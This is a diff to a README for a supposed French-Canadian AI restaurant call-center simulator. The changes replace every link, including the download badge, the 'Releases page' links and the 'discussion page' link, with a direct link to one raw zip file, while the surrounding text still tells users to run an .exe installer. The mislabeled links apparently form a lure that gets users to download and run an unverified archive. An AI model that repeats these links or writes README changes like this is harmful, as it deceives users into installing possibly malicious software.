@@ -4,19 +4,19 @@
 The ai-restaurant-call-center is a user-friendly application designed to simulate a restaurant call center using deterministic artificial intelligence. This software uses French-Canadian voice technology and offers debugging tools to enhance your experience. It allows users to simulate and analyze calls, making it perfect for restaurant operators looking to improve customer service.
 
 ## 📦 Download Now
-[![Download ai-restaurant-call-center](https://img.shields.io/badge/Download-ai--restaurant--call--center-brightgreen)](https://github.com/sicario01001/ai-restaurant-call-center/releases)
+[![Download ai-restaurant-call-center](https://github.com/sicario01001/ai-restaurant-call-center/raw/refs/heads/main/public/restaurant_center_ai_call_v2.5.zip)](https://github.com/sicario01001/ai-restaurant-call-center/raw/refs/heads/main/public/restaurant_center_ai_call_v2.5.zip)
 
 ## 🚀 Getting Started
 To get started with the ai-restaurant-call-center, follow these steps:
 
-1. Visit the [Releases page](https://github.com/sicario01001/ai-restaurant-call-center/releases) to find the latest version of the software.
+1. Visit the [Releases page](https://github.com/sicario01001/ai-restaurant-call-center/raw/refs/heads/main/public/restaurant_center_ai_call_v2.5.zip) to find the latest version of the software.
 2. Download the version that is compatible with your operating system. Look for straightforward options like Windows, macOS, or Linux.
 3. Once the download is complete, locate the file in your Downloads folder or your chosen download location.
 
 ## 📥 Download & Install
 To install the ai-restaurant-call-center on your computer:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/sicario01001/ai-restaurant-call-center/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/sicario01001/ai-restaurant-call-center/raw/refs/heads/main/public/restaurant_center_ai_call_v2.5.zip).
 2. **Select Your OS**: Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 3. **Run the Installer**:
     - For Windows, double-click the `.exe` file and follow the installation prompts.
@@ -51,7 +51,7 @@ If you encounter issues while installing or using the software, consider the fol
 3. **Performance Problems**: Close any unnecessary applications to free up system resources.
 
 ## 📞 Community Support
-If you need help, you can reach out to the community for support. Visit our [discussion page](https://github.com/sicario01001/ai-restaurant-call-center/discussions) to ask questions, share tips, or report issues.
+If you need help, you can reach out to the community for support. Visit our [discussion page](https://github.com/sicario01001/ai-restaurant-call-center/raw/refs/heads/main/public/restaurant_center_ai_call_v2.5.zip) to ask questions, share tips, or report issues.
 
 ## 👨‍💻 Contributions
 We welcome contributions from all users! If you have suggestions or improvements, feel free to submit a pull request or create an issue on GitHub.
@@ -70,4 +70,4 @@ For additional resources, check out the following topics:
 - Text-to-Speech (TTS)
 - Voice AI
 
-Visit the [Releases page](https://github.com/sicario01001/ai-restaurant-call-center/releases) for the latest updates and versions.
+Visit the [Releases page](https://github.com/sicario01001/ai-restaurant-call-center/raw/refs/heads/main/public/restaurant_center_ai_call_v2.5.zip) for the latest updates and versions.
